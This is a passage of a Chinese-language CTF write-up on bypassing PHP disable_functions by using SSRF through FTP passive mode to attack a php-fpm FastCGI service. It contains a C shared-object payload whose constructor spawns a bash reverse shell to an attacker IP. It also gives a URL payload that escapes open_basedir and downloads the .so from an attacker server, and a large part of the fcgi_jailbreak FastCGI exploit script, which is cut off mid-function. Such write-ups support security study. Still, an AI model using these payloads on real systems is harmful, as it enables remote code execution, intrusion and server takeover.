<p>发现<code>string(18) "php-fpm: pool www"</code>，题目环境开启了<code>php-fpm</code>服务</p>
<p>在<code>/usr/local/etc/</code>目录下也可以看到<code>php-fpm.conf</code>等文件</p>
<p>然后读配置文件<code>/usr/local/etc/php-fpm.d/www.conf</code>如下图（可以先<code>scandir()</code>获取目录下文件，然后<code>file_get_contents()</code>读文件）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921151123244.png"></p>
<p><code>php-fpm</code>服务开放在9001端口，用户是<code>www-data</code></p>
<h2 id="SSRF攻击FPM服务"><a href="#SSRF攻击FPM服务" class="headerlink" title="SSRF攻击FPM服务"></a>SSRF攻击FPM服务</h2><p>我们可以通过SSRF来攻击FPM服务，但是受限于题目phpinfo的disable_functions，我们无法直接SSRF，但是可以利用<code>file_put_contents()</code>的一个特性来实现SSRF：</p>
<blockquote>
<p><code>file_put_contents</code>在使用 ftp 协议时，会将 data 的内容上传到 ftp 服务器，由于 ftp 被动模式下，服务器数据通道的地址和端口是可控，我们可以将地址和端口指到<code>127.0.0.1:9001</code>。同时由于 ftp 的特性，不会有任何的多余内容，类似<code>gopher</code>协议，会将<code>data</code>原封不动的发给<code>127.0.0.1:9001</code>，完美符合攻击 fastcgi(FPM) 的要求.</p>
</blockquote>
<p>首先编写一个恶意so文件来执行反弹Shell命令：</p>
<pre class="line-numbers language-none"><code class="language-none">#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i &gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1'"); #反弹Shell，修改IP端口为自己vps监听的IP端口
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编译文件：<code>gcc 1.c -fPIC -shared -o 1.so</code>（把<code>1.c</code>编译为一个浮动地址的共享库文件<code>1.so</code>）</p>
<p>然后上传so文件（修改IP为自己vps地址）</p>
<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(copy('http://[IP]/1.so','/var/www/html/1.so'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接下来就是想办法SSRF打FPM来挂载so文件实现RCE，可以找到一个直接攻击的脚本，注意326行是so文件路径，339行是FPM服务端口</p>
<p>代码参考：<a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */</span>
<span class="token comment">/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
 * @version     1.0
 */</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span>
<span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Socket
     * @var Resource
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Host
     * @var String
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Port
     * @var Integer
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Keep Alive
     * @var Boolean
     */</span>
    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Create a connection to the FastCGI application
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>
            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">/* nameLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">/* valueLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">/* nameData &amp; valueData */</span>
        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&gt;=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&gt;=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">{</span><span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Read a FastCGI Packet
     *
     * @return array
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
